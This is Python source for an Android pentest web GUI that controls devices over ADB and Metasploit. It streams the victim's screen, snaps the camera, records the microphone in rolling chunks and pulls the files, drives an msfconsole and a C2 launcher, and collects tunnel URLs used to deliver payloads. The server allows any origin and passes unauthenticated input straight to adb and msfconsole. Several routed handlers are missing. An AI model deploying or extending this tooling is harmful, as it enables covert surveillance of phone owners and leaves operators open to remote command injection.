#!/usr/bin/env python3
"""
secV Android Pentest GUI
Full-featured web GUI for all android pentest operations.

Launched via android_pentest: set mode gui; run
Standalone: python3 android_gui.py [--port 8897] [--serial <device>]
"""
import argparse, json, os, queue, re, shutil, struct, subprocess, sys
import socketserver, threading, time, webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, parse_qs

# ── Globals ────────────────────────────────────────────────────────────────────
_GUI_PORT    = 8897
_C2_PORT     = 8891
_MODULE_DIR  = Path(__file__).parent
_SCRIPT      = _MODULE_DIR / "android_pentest.py"
_C2_SCRIPT   = _MODULE_DIR / "c2_gui.py"
_PYTHON      = sys.executable

_c2_proc:       Optional[subprocess.Popen] = None
_sse_clients:   list = []          # list of queue.Queue, one per SSE connection
_sse_lock       = threading.Lock()
_gui_settings   = {"lhost": "", "lport": "4444", "bore_server": "bore.pub",
                   "nvd_api_key": "", "c2_host": "", "c2_port": "8889"}
_captured_qr:   list = []          # QR strings/ASCII captured from operation output

# ── Multi-session pool ─────────────────────────────────────────────────────────
_sessions:      dict = {}          # session_id → session dict
_sessions_lock  = threading.Lock()
_session_seq    = 0                # monotonic ID counter
# ANSI colour codes cycled per session (32=green,36=cyan,33=yellow,35=magenta,34=blue,…)
_SESSION_COLORS = ["32","36","33","35","34","92","96","93","95","94"]

# ── Media / Meterpreter state ──────────────────────────────────────────────────
_screen_procs: dict = {}         # serial → (adb_proc, ff_proc)
_screen_lock  = threading.Lock()
_cam_relay:   Optional[subprocess.Popen] = None  # proxied webcam proc
_cam_port     = 0
_cam_lock     = threading.Lock()
_mic_chunks:  list = []          # [(path, ts), …]  rolling WAV recordings
_mic_proc:    Optional[subprocess.Popen] = None
_mic_lock     = threading.Lock()
_msf_proc:    Optional[subprocess.Popen] = None  # interactive msfconsole
_msf_clients: list = []          # SSE queues for MSF output
_msf_lock     = threading.Lock()
_msf_out_buf: list = []          # last 500 lines of MSF output

# ── Broadcast helpers ──────────────────────────────────────────────────────────

def _broadcast(line: str):
    with _sse_lock:
        dead = []
        for q in _sse_clients:
            try:
                q.put_nowait(line)
            except queue.Full:
                dead.append(q)
        for q in dead:
            _sse_clients.remove(q)


def _run_session(sid: int, context: dict):
    """Run one android_pentest operation as an independent session."""
    op     = context.get("params", {}).get("operation", "?")
    device = context.get("params", {}).get("device", "")
    color  = _SESSION_COLORS[sid % len(_SESSION_COLORS)]
    prefix = f"\x1b[{color}m[#{sid} {op}]\x1b[0m"

    with _sessions_lock:
        _sessions[sid].update(status="running", pid=None)

    _broadcast(f"{prefix} \x1b[32m[+] starting\x1b[0m")
    status = "error"
    try:
        proc = subprocess.Popen(
            [_PYTHON, str(_SCRIPT)],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT)
        with _sessions_lock:
            _sessions[sid]["proc"] = proc
            _sessions[sid]["pid"]  = proc.pid
        proc.stdin.write(json.dumps(context).encode())
        proc.stdin.close()
        for raw in iter(proc.stdout.readline, b""):
            line = raw.decode(errors="replace").rstrip("\n")
            if line.startswith("\x00RESULT\x00"):
                json_part = line[len("\x00RESULT\x00"):]
                _broadcast(f"__RESULT__:{json_part}")
                with _sessions_lock:
                    if sid in _sessions:
                        _sessions[sid]["result"] = json_part
                continue  # never print raw JSON blob to terminal
            _broadcast(f"{prefix} {line}")
            _maybe_capture_qr(line)
        proc.wait()
        status = "done"
        _broadcast(f"{prefix} \x1b[33m[*] exit {proc.returncode}\x1b[0m")
    except Exception as e:
        _broadcast(f"{prefix} \x1b[31m[!] {e}\x1b[0m")
    finally:
        with _sessions_lock:
            if sid in _sessions:
                _sessions[sid]["status"]  = status
                _sessions[sid]["end_ts"]  = time.time()
                _sessions[sid]["pid"]     = None
                _sessions[sid]["proc"]    = None
        _broadcast(f"\x1b[35m[done:{sid}]\x1b[0m")


def _adb(*args) -> str:
    adb = shutil.which("adb") or "adb"
    try:
        r = subprocess.run([adb] + list(args), capture_output=True, text=True, timeout=10)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)


_qr_buf: list = []
def _maybe_capture_qr(line: str):
    """Buffer consecutive lines that look like ASCII QR art, then store them."""
    stripped = line.strip()
    # detect QR block start/end (dense ░▓█ characters or ▄▀ style)
    if any(c in stripped for c in ("█", "▄", "▀", "░", "▓", "▐", "▌")):
        _qr_buf.append(line)
    else:
        if len(_qr_buf) >= 4:
            _captured_qr.append("\n".join(_qr_buf))
            _broadcast("\x1b[35m[qr-captured]\x1b[0m")
        _qr_buf.clear()
    # also capture QR delivery URLs
    if "bore.pub" in line or "trycloudflare.com" in line:
        m = re.search(r'https?://\S+', line)
        if m:
            _captured_qr.append(f"URL: {m.group()}")
            _broadcast(f"\x1b[35m[qr-url-captured] {m.group()}\x1b[0m")


def _c2_running() -> bool:
    global _c2_proc
    if _c2_proc and _c2_proc.poll() is None:
        return True
    _c2_proc = None
    return False


def _ensure_c2(port: int = _C2_PORT) -> bool:
    global _c2_proc
    if _c2_running():
        return True
    if not _C2_SCRIPT.exists():
        return False
    try:
        _c2_proc = subprocess.Popen(
            [_PYTHON, str(_C2_SCRIPT), "--port", str(port), "--no-browser"],
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(1.0)
        return _c2_proc.poll() is None
    except Exception:
        return False


# ── HTTP Handler ───────────────────────────────────────────────────────────────

class _Handler(BaseHTTPRequestHandler):

    def log_message(self, *_):
        pass

    # ── routing ──────────────────────────────────────────────────────────────

    def do_GET(self):
        p = urlparse(self.path).path
        if   p == "/" or p == "/index.html":   self._serve_html()
        elif p == "/api/devices":              self._api_devices()
        elif p == "/api/devices/reload":       self._api_devices_reload()
        elif p == "/api/stream":               self._api_sse()
        elif p == "/api/status":               self._api_status()
        elif p == "/api/sessions":             self._api_sessions()
        elif p == "/api/applist":              self._api_applist()
        elif p == "/api/devinfo":              self._api_devinfo()
        elif p == "/api/deps":                 self._api_deps()
        elif p == "/api/workdir":              self._api_workdir()
        elif p == "/api/lhost":                self._api_lhost()
        elif p == "/api/qr":                   self._api_qr()
        elif p == "/api/settings":             self._api_get_settings()
        elif p == "/api/c2/launch":            self._api_c2_launch()
        elif p == "/api/c2/stop":              self._api_c2_stop()
        elif p == "/api/c2/status":            self._api_c2_status()
        elif p == "/api/media/screen":         self._api_screen_stream()
        elif p == "/api/media/screen/snap":    self._api_screen_snap()
        elif p == "/api/media/camera/snap":    self._api_camera_snap()
        elif p == "/api/media/camera/stream":  self._api_camera_stream()
        elif p == "/api/media/camera/list":    self._api_camera_list()
        elif p == "/api/media/camera/stop":    self._api_camera_stop()
        elif p == "/api/media/mic/chunk":      self._api_mic_chunk()
        elif p == "/api/msf/stream":           self._api_msf_sse()
        elif p == "/api/msf/sessions":         self._api_msf_sessions()
        elif p == "/api/proc/stream":          self._api_proc_stream()
        elif p == "/api/proc/list":            self._api_proc_list()
        else:                                  self._send(404, "text/plain", b"not found")

    def do_POST(self):
        p = urlparse(self.path).path
        body = self._read_body()
        if   p == "/api/run":               self._api_run(body)
        elif p == "/api/kill":              self._api_kill()
        elif p == "/api/adb":               self._api_adb(body)
        elif p == "/api/settings":          self._api_settings(body)
        elif p == "/api/media/mic/start":   self._api_mic_start(body)
        elif p == "/api/media/mic/stop":    self._api_mic_stop()
        elif p == "/api/media/speaker":     self._api_speaker(body)
        elif p == "/api/msf/start":         self._api_msf_start(body)
        elif p == "/api/msf/stop":          self._api_msf_stop()
        elif p == "/api/msf/send":          self._api_msf_send(body)
        else:                               self._send(404, "text/plain", b"not found")

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    # ── helpers ───────────────────────────────────────────────────────────────

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def _send(self, code: int, ct: str, body: bytes):
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self._cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _json(self, data):
        self._send(200, "application/json", json.dumps(data).encode())

    def _read_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length) if length else b"{}"
        try:    return json.loads(raw)
        except: return {}

    # ── endpoints ─────────────────────────────────────────────────────────────

    def _api_devices(self):
        out  = _adb("devices", "-l")
        devs = []
        for line in out.splitlines()[1:]:
            line = line.strip()
            if not line or "offline" in line: continue
            parts = line.split()
            if len(parts) < 2: continue
            serial = parts[0]
            state  = parts[1]
            info   = {"serial": serial, "tags": " ".join(parts[2:]), "state": state}
            if state == "unauthorized":
                info["label"]  = f"{serial} (tap Allow on device)"
                info["status"] = "unauthorized"
            elif state == "device":
                info["status"] = "authorized"
                # enrich with model info
                try:
                    raw = _adb("-s", serial, "shell",
                               "getprop ro.product.brand; getprop ro.product.model; "
                               "getprop ro.build.version.release; getprop ro.build.version.sdk")
                    lines = [x.strip() for x in raw.splitlines() if x.strip()]
                    if len(lines) >= 2:
                        info["brand"]   = lines[0]
                        info["model"]   = lines[1]
                        info["android"] = lines[2] if len(lines) > 2 else ""
                        info["sdk"]     = lines[3] if len(lines) > 3 else ""
                        info["label"]   = f"{lines[0]} {lines[1]}"
                except Exception:
                    pass
            else:
                continue
            devs.append(info)
        self._json({"devices": devs})

    def _api_devices_reload(self):
        """Kill and restart ADB server, wait for devices to re-enumerate, return fresh list."""
        import time as _time
        _adb("kill-server")
        _time.sleep(0.6)
        _adb("start-server")
        # wait up to 4s for at least one device to reappear
        for _ in range(8):
            _time.sleep(0.5)
            out = _adb("devices")
            if out.count("\tdevice") > 0:
                break
        self._api_devices()

    # ── MEDIA: Screen ─────────────────────────────────────────────────────────

    def _api_screen_snap(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        r = subprocess.run([adb] + prefix + ["exec-out", "screencap", "-p"],
                           capture_output=True, timeout=5)
        if r.returncode == 0 and r.stdout:
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(r.stdout)))
            self._cors()
            self.end_headers()
            self.wfile.write(r.stdout)
        else:
            self._json({"ok": False, "error": "screencap failed"})

    def _api_screen_stream(self):
        global _screen_procs
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        adb    = shutil.which("adb") or "adb"
        ff     = shutil.which("ffmpeg")
        prefix = (["-s", serial] if serial else [])

        self.send_response(200)
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=secvframe")
        self.send_header("Cache-Control", "no-cache, no-store")
        self.send_header("Connection", "close")
        self._cors()
        self.end_headers()

        BOUNDARY = b"--secvframe\r\nContent-Type: image/jpeg\r\n\r\n"

        if ff:
            # H.264 pipeline → ffmpeg → JPEG frames
            try:
                adb_p = subprocess.Popen(
                    [adb] + prefix + ["exec-out", "screenrecord",
                                      "--output-format=h264", "--time-limit=0", "-"],
                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                ff_p = subprocess.Popen(
                    [ff, "-loglevel", "quiet", "-i", "pipe:0",
                     "-vf", "fps=15,scale=-2:720",
                     "-f", "image2pipe", "-vcodec", "mjpeg", "-q:v", "3", "pipe:1"],
                    stdin=adb_p.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                with _screen_lock:
                    _screen_procs[serial or "__default__"] = (adb_p, ff_p)
                buf = b""
                while True:
                    chunk = ff_p.stdout.read(8192)
                    if not chunk:
                        break
                    buf += chunk
                    while True:
                        soi = buf.find(b"\xff\xd8")
                        if soi == -1: break
                        eoi = buf.find(b"\xff\xd9", soi + 2)
                        if eoi == -1: break
                        frame = buf[soi:eoi + 2]
                        buf   = buf[eoi + 2:]
                        try:
                            self.wfile.write(BOUNDARY + frame + b"\r\n")
                            self.wfile.flush()
                        except (BrokenPipeError, ConnectionResetError):
                            return
            except Exception:
                pass
            finally:
                for p in (adb_p, ff_p):
                    try: p.terminate()
                    except: pass
                with _screen_lock:
                    _screen_procs.pop(serial or "__default__", None)
        else:
            # Screencap loop fallback (PNG, ~5fps)
            while True:
                try:
                    r = subprocess.run(
                        [adb] + prefix + ["exec-out", "screencap", "-p"],
                        capture_output=True, timeout=4)
                    if r.returncode != 0 or not r.stdout:
                        time.sleep(0.5)
                        continue
                    # PNG → serve as JPEG boundary (browsers accept PNG in MJPEG)
                    hdr = (b"--secvframe\r\n"
                           b"Content-Type: image/png\r\n\r\n")
                    self.wfile.write(hdr + r.stdout + b"\r\n")
                    self.wfile.flush()
                    time.sleep(0.18)
                except (BrokenPipeError, ConnectionResetError):
                    break
                except Exception:
                    time.sleep(0.3)

    # ── MEDIA: Camera ──────────────────────────────────────────────────────────

    def _api_camera_list(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        # list camera IDs via camera2 API dump
        out = subprocess.run(
            [adb] + prefix + ["shell", "cmd", "media.camera", "get-camera-info"],
            capture_output=True, text=True, timeout=6).stdout
        cameras = []
        for line in out.splitlines():
            if "Camera" in line and "id" in line.lower():
                cameras.append(line.strip())
        if not cameras:
            # fallback: check /dev/video*
            dev = subprocess.run(
                [adb] + prefix + ["shell", "ls", "/dev/video*"],
                capture_output=True, text=True, timeout=4).stdout
            cameras = [l.strip() for l in dev.splitlines() if l.strip()]
        self._json({"cameras": cameras or ["camera0", "camera1"]})

    def _api_camera_snap(self):
        """Single camera frame via Meterpreter webcam_snap or ADB intent."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        cam_id = (qs.get("id") or ["0"])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        # Use ADB screencap of camera preview via intent
        snap_path = f"/sdcard/secv_cam_{cam_id}.jpg"
        subprocess.run(
            [adb] + prefix + ["shell",
             f"am start -a android.media.action.STILL_IMAGE_CAMERA; sleep 1; screencap -p > {snap_path}"],
            timeout=6, capture_output=True)
        time.sleep(1.2)
        r = subprocess.run(
            [adb] + prefix + ["exec-out", "cat", snap_path],
            capture_output=True, timeout=5)
        if r.returncode == 0 and r.stdout:
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(r.stdout)))
            self._cors(); self.end_headers()
            self.wfile.write(r.stdout)
        else:
            self._json({"ok": False, "error": "camera snap failed — ensure Meterpreter session active"})

    def _api_camera_stream(self):
        """Relay Meterpreter webcam MJPEG stream (started externally via webcam_stream cmd)."""
        global _cam_relay, _cam_port
        qs   = parse_qs(urlparse(self.path).query)
        port = int((qs.get("port") or [str(_cam_port or 8880)])[0])
        # proxy the local MJPEG server that meterpreter started
        import http.client as _hc
        try:
            conn = _hc.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            ct = resp.getheader("Content-Type", "multipart/x-mixed-replace; boundary=--")
            self.send_response(200)
            self.send_header("Content-Type", ct)
            self.send_header("Cache-Control", "no-cache")
            self._cors(); self.end_headers()
            while True:
                chunk = resp.read(4096)
                if not chunk: break
                try:
                    self.wfile.write(chunk); self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError):
                    break
        except Exception as e:
            self._json({"ok": False, "error": str(e),
                        "hint": "Start webcam_stream in Meterpreter first"})

    def _api_camera_stop(self):
        global _cam_relay
        with _cam_lock:
            if _cam_relay:
                try: _cam_relay.terminate()
                except: pass
                _cam_relay = None
        self._json({"ok": True})

    # ── MEDIA: Microphone ──────────────────────────────────────────────────────

    def _api_mic_start(self, body: dict):
        global _mic_proc, _mic_chunks
        serial   = body.get("device", "")
        duration = int(body.get("duration", 4))
        lhost    = body.get("lhost") or _gui_settings.get("lhost", "")
        lport    = int(body.get("lport", 4444))
        prefix   = (["-s", serial] if serial else [])
        adb      = shutil.which("adb") or "adb"
        work_dir = Path.home() / ".secv" / "android" / "media"
        work_dir.mkdir(parents=True, exist_ok=True)

        def _record_loop():
            global _mic_proc
            idx = 0
            while True:
                with _mic_lock:
                    if _mic_proc is None:
                        break
                wav = str(work_dir / f"mic_{idx:04d}.wav")
                dev_path = f"/sdcard/secv_mic_{idx}.wav"
                # record via ADB + Android's tinycap or toybox
                r = subprocess.run(
                    [adb] + prefix + ["shell",
                     f"am startservice --user 0 -n com.android.soundrecorder/.SoundRecorderService 2>/dev/null; "
                     f"sleep {duration}; am stopservice -n com.android.soundrecorder/.SoundRecorderService 2>/dev/null"],
                    timeout=duration + 4, capture_output=True)
                # fallback: pull via screenrecord audio channel isn't available — use ADB exec-out of /dev/audio
                # simpler: use `adb shell` + `tinymix`/`tinycap` if present
                tinycap = subprocess.run(
                    [adb] + prefix + ["shell", f"tinycap /sdcard/secv_mic_{idx}.wav {duration} 2>/dev/null || "
                                              f"toybox tinycap /sdcard/secv_mic_{idx}.wav {duration} 2>/dev/null"],
                    timeout=duration + 6, capture_output=True)
                # pull file
                p = subprocess.run(
                    [adb] + prefix + ["pull", dev_path, wav],
                    capture_output=True, timeout=8)
                if p.returncode == 0 and Path(wav).exists():
                    with _mic_lock:
                        _mic_chunks.append((wav, time.time()))
                        if len(_mic_chunks) > 30:
                            _mic_chunks.pop(0)
                idx += 1
                time.sleep(0.1)

        with _mic_lock:
            _mic_proc = True   # sentinel to signal running
        t = threading.Thread(target=_record_loop, daemon=True)
        t.start()
        self._json({"ok": True, "msg": f"Microphone capture started ({duration}s chunks)"})

    def _api_mic_stop(self):
        global _mic_proc
        with _mic_lock:
            _mic_proc = None
        self._json({"ok": True})

    def _api_mic_chunk(self):
        """Serve the latest mic recording as WAV."""
        with _mic_lock:
            if not _mic_chunks:
                self._json({"ok": False, "error": "no recording yet"})
                return
            path, _ = _mic_chunks[-1]
        try:
            data = Path(path).read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "audio/wav")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-cache")
            self._cors(); self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    # ── MEDIA: Speaker ─────────────────────────────────────────────────────────

    def _api_speaker(self, body: dict):
        """Push a base64-encoded audio file to the device and play it."""
        import base64
        serial  = body.get("device", "")
        b64     = body.get("data", "")
        ext     = str(body.get("ext", "mp3")).strip().lower()
        if ext not in {"mp3", "wav"}:
            self._json({"ok": False, "error": "invalid audio extension"}); return
        prefix  = (["-s", serial] if serial else [])
        adb     = shutil.which("adb") or "adb"
        if not b64:
            self._json({"ok": False, "error": "no audio data"}); return
        try:
            audio = base64.b64decode(b64)
        except Exception:
            self._json({"ok": False, "error": "invalid base64"}); return
        tmp = Path("/tmp") / f"secv_spk_{int(time.time())}.{ext}"
        tmp.write_bytes(audio)
        dev_path = f"/sdcard/secv_spk.{ext}"
        subprocess.run([adb] + prefix + ["push", str(tmp), dev_path],
                       capture_output=True, timeout=10)
        mime = "audio/mpeg" if ext == "mp3" else "audio/wav"
        subprocess.run(
            [adb] + prefix + ["shell",
             f"am start -a android.intent.action.VIEW "
             f"-d file://{dev_path} -t {mime}"],
            capture_output=True, timeout=5)
        self._json({"ok": True, "path": dev_path})

    # ── MSF Meterpreter console ────────────────────────────────────────────────

    def _api_msf_start(self, body: dict):
        global _msf_proc, _msf_out_buf
        if _msf_proc and _msf_proc.poll() is None:
            self._json({"ok": True, "msg": "already running"}); return
        msfc = shutil.which("msfconsole")
        if not msfc:
            self._json({"ok": False, "error": "msfconsole not found"}); return
        _msf_out_buf = []
        init_cmd = body.get("init", "")

        def _reader():
            global _msf_proc
            for raw in iter(_msf_proc.stdout.readline, b""):
                line = raw.decode(errors="replace").rstrip("\n")
                with _msf_lock:
                    _msf_out_buf.append(line)
                    if len(_msf_out_buf) > 500:
                        _msf_out_buf.pop(0)
                    for q in list(_msf_clients):
                        try: q.put_nowait(line)
                        except queue.Full: pass

        _msf_proc = subprocess.Popen(
            [msfc, "-q"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT)
        threading.Thread(target=_reader, daemon=True).start()
        if init_cmd:
            time.sleep(2)
            try:
                _msf_proc.stdin.write((init_cmd + "\n").encode())
                _msf_proc.stdin.flush()
            except Exception: pass
        self._json({"ok": True})

    def _api_msf_stop(self):
        global _msf_proc
        if _msf_proc:
            try: _msf_proc.terminate()
            except: pass
            _msf_proc = None
        self._json({"ok": True})

    def _api_msf_send(self, body: dict):
        global _msf_proc
        cmd = body.get("cmd", "")
        if not _msf_proc or _msf_proc.poll() is not None:
            self._json({"ok": False, "error": "msfconsole not running"}); return
        try:
            _msf_proc.stdin.write((cmd + "\n").encode())
            _msf_proc.stdin.flush()
            self._json({"ok": True})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_msf_sse(self):
        q = queue.Queue(maxsize=500)
        with _msf_lock:
            _msf_clients.append(q)
            history = list(_msf_out_buf)
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Connection", "keep-alive")
        self._cors(); self.end_headers()
        try:
            # replay history
            for line in history:
                self.wfile.write(f"data: {line}\n\n".encode()); self.wfile.flush()
            while True:
                try:
                    line = q.get(timeout=15)
                    self.wfile.write(f"data: {line}\n\n".encode()); self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(b": ping\n\n"); self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            with _msf_lock:
                try: _msf_clients.remove(q)
                except ValueError: pass

    def _api_msf_sessions(self):
        global _msf_out_buf
        with _msf_lock:
            buf = "\n".join(_msf_out_buf[-100:])
        sessions = []
        for line in buf.splitlines():
            if "Meterpreter" in line or "meterpreter" in line:
                sessions.append(line.strip())
        self._json({"sessions": sessions, "running": bool(_msf_proc and _msf_proc.poll() is None)})

    # ── proc stream ───────────────────────────────────────────────────────────

    def _api_proc_list(self):
        """One-shot JSON process list for the current device."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        filt   = (qs.get("filter") or [""])[0].lower()
        prefix = ["-s", serial] if serial else []
        out    = _adb(*prefix, "shell", "ps", "-A", "2>/dev/null")
        procs  = []
        for line in out.splitlines():
            parts = line.split()
            if len(parts) < 9 or parts[0] == "USER":
                continue
            name = parts[-1]
            if filt and filt not in name.lower() and filt not in parts[1]:
                continue
            procs.append({"user": parts[0], "pid": parts[1],
                          "ppid": parts[2], "state": parts[7] if len(parts) > 7 else "?",
                          "name": name})
        self._json({"procs": procs, "total": len(procs)})

    def _api_proc_stream(self):
        """SSE stream — pushes updated process list every 2 s."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        filt   = (qs.get("filter") or [""])[0].lower()
        prefix = ["-s", serial] if serial else []
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream; charset=utf-8")
        self.send_header("Cache-Control", "no-cache")
        self._cors()
        self.end_headers()
        try:
            while True:
                out   = _adb(*prefix, "shell", "ps", "-A", "2>/dev/null")
                procs = []
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) < 9 or parts[0] == "USER":
                        continue
                    name = parts[-1]
                    if filt and filt not in name.lower() and filt not in parts[1]:
                        continue
                    procs.append({"user": parts[0], "pid": parts[1],
                                  "ppid": parts[2], "state": parts[7] if len(parts) > 7 else "?",
                                  "name": name})
                payload = json.dumps({"procs": procs, "ts": time.time()})
                self.wfile.write(f"data: {payload}\n\n".encode())
                self.wfile.flush()
                time.sleep(2)
        except (BrokenPipeError, ConnectionResetError):
            pass

    # ── devinfo ────────────────────────────────────────────────────────────────

    def _api_devinfo(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = ["-s", serial] if serial else []
        props  = {}
        for prop in ["ro.product.model", "ro.product.brand", "ro.build.version.release",
                     "ro.build.version.sdk", "ro.product.cpu.abi", "ro.serialno"]:
            val = _adb(*prefix, "shell", "getprop", prop)
            props[prop] = val.strip()
        self._json(props)

    def _api_applist(self):
        qs       = parse_qs(urlparse(self.path).query)
        serial   = (qs.get("serial") or [""])[0]
        prefix   = ["-s", serial] if serial else []
        out      = _adb(*prefix, "shell", "pm", "list", "packages", "-3")
        packages = sorted(l.replace("package:", "").strip() for l in out.splitlines() if l.startswith("package:"))
        self._json({"packages": packages})

    def _api_status(self):
        with _sessions_lock:
            running = [s for s in _sessions.values() if s["status"] == "running"]
        self._json({
            "running":  len(running) > 0,
            "count":    len(running),
            "op":       ", ".join(s["op"] for s in running) if running else "",
            "pid":      running[0]["pid"] if len(running) == 1 else None,
            "sessions": [{"id": s["id"], "op": s["op"],
                          "device": s.get("device", ""), "pid": s["pid"]}
                         for s in running],
        })

    def _api_sessions(self):
        now = time.time()
        with _sessions_lock:
            rows = [{
                "id":      s["id"],
                "op":      s["op"],
                "device":  s.get("device", ""),
                "status":  s["status"],
                "pid":     s["pid"],
                "elapsed": round((s.get("end_ts") or now) - s["start_ts"], 1),
                "color":   _SESSION_COLORS[s["id"] % len(_SESSION_COLORS)],
            } for s in _sessions.values()]
        self._json({"sessions": rows})

    def _api_run(self, body: dict):
        global _session_seq
        with _sessions_lock:
            _session_seq += 1
            sid = _session_seq
            _sessions[sid] = {
                "id":       sid,
                "op":       body.get("params", {}).get("operation", "?"),
                "device":   body.get("params", {}).get("device", ""),
                "start_ts": time.time(),
                "end_ts":   None,
                "status":   "starting",
                "pid":      None,
                "proc":     None,
            }
        threading.Thread(target=_run_session, args=(sid, body), daemon=True).start()
        self._json({"ok": True, "session_id": sid})

    def _api_kill(self):
        qs  = parse_qs(urlparse(self.path).query)
        sid = int((qs.get("session") or ["0"])[0])
        killed = []
        with _sessions_lock:
            targets = ([_sessions[sid]] if sid and sid in _sessions
                       else [s for s in _sessions.values() if s["status"] == "running"])
        for s in targets:
            p = s.get("proc")
            if p and p.poll() is None:
                try:
                    p.terminate()
                    killed.append(s["id"])
                    _broadcast(f"\x1b[31m[!] Session #{s['id']} ({s['op']}) killed\x1b[0m")
                except Exception as e:
                    _broadcast(f"\x1b[31m[!] Kill #{s['id']} failed: {e}\x1b[0m")
        self._json({"ok": True, "killed": killed})

    def _api_adb(self, body: dict):
        args = body.get("args", [])
        if not isinstance(args, list):
            self._json({"output": "invalid args"})
            return
        out = _adb(*args)
        self._json({"output": out})

    def _api_qr(self):
        self._json({"qr": list(_captured_qr)})

    def _api_get_settings(self):
        self._json({"settings": _gui_settings})

    def _api_lhost(self):
        import socket as _sock
        ip = ""
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass
        self._json({"lhost": ip})

    def _api_deps(self):
        tools = {
            # system
            "adb":          {"cmd": "adb", "install": "pacman -S android-tools  # or apt install adb"},
            "apktool":      {"cmd": "apktool", "install": "pacman -S apktool  # or apt install apktool"},
            "aapt2":        {"cmd": "aapt2", "install": "included with Android SDK build-tools"},
            "aapt":         {"cmd": "aapt", "install": "pacman -S android-tools"},
            "jadx":         {"cmd": "jadx", "install": "pacman -S jadx  # or apt install jadx"},
            "keytool":      {"cmd": "keytool", "install": "apt install default-jdk"},
            "msfvenom":     {"cmd": "msfvenom", "install": "apt install metasploit-framework"},
            "msfconsole":   {"cmd": "msfconsole", "install": "apt install metasploit-framework"},
            "frida":        {"cmd": "frida", "install": "pip3 install frida-tools"},
            "objection":    {"cmd": "objection", "install": "pip3 install objection"},
            "bore":         {"cmd": "bore", "install": "curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin"},
            "cloudflared":  {"cmd": "cloudflared", "install": "apt install cloudflared"},
            "nmap":         {"cmd": "nmap", "install": "pacman -S nmap  # or apt install nmap"},
            "qrencode":     {"cmd": "qrencode", "install": "apt install qrencode"},
            # python
            "paramiko":     {"cmd": None, "pymod": "paramiko", "install": "pip3 install paramiko"},
            "requests":     {"cmd": None, "pymod": "requests", "install": "pip3 install requests"},
            "qrcode":       {"cmd": None, "pymod": "qrcode", "install": "pip3 install qrcode[pil]"},
            "cryptography": {"cmd": None, "pymod": "cryptography", "install": "pip3 install cryptography"},
            "frida-py":     {"cmd": None, "pymod": "frida", "install": "pip3 install frida"},
        }
        result = {}
        for name, info in tools.items():
            if info.get("cmd"):
                ok = shutil.which(info["cmd"]) is not None
            else:
                try:
                    __import__(info["pymod"])
                    ok = True
                except ImportError:
                    ok = False
            result[name] = {"ok": ok, "install": info["install"]}
        self._json({"deps": result})

    def _api_workdir(self):
        base = Path.home() / ".secv" / "android"
        files = []
        if base.exists():
            for p in sorted(base.rglob("*"))[-200:]:
                if p.is_file():
                    try:
                        files.append({
                            "path": str(p.relative_to(Path.home())),
                            "full": str(p),
                            "size": p.stat().st_size,
                            "mtime": int(p.stat().st_mtime),
                        })
                    except Exception:
                        pass
        files.sort(key=lambda x: x["mtime"], reverse=True)
        self._json({"files": files[:100], "base": str(base)})

    def _api_settings(self, body: dict):
        _gui_settings.update({k: v for k, v in body.items() if k in
            ("lhost", "lport", "bore_server", "nvd_api_key", "c2_host", "c2_port")})
        self._json({"ok": True, "settings": _gui_settings})

    def _api_c2_status(self):
        qs   = parse_qs(urlparse(self.path).query)
        port = int((qs.get("port") or [str(_C2_PORT)])[0])
        self._json({"running": _c2_running(), "port": port,
                    "url": f"http://127.0.0.1:{port}"})

